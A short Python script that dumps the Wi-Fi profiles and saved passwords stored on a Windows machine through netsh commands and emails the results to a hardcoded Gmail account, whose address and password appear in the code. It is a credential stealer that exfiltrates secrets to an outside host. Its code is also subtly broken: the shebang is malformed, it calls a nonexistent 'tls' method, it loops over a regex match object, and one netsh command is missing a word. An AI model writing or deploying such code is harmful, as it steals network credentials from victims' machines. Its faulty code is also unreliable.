#!usr/bin/env python
import re
import smtplib
import subprocess


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.tls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.search(r"(?:Profiles\s*:\s)(.*)", networks)

result = ""
for network_name in network_names_list:
    command = "netsh wlan profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result

send_mail("tsxnshaw@gmail.com", "sa1234@abcd", result)
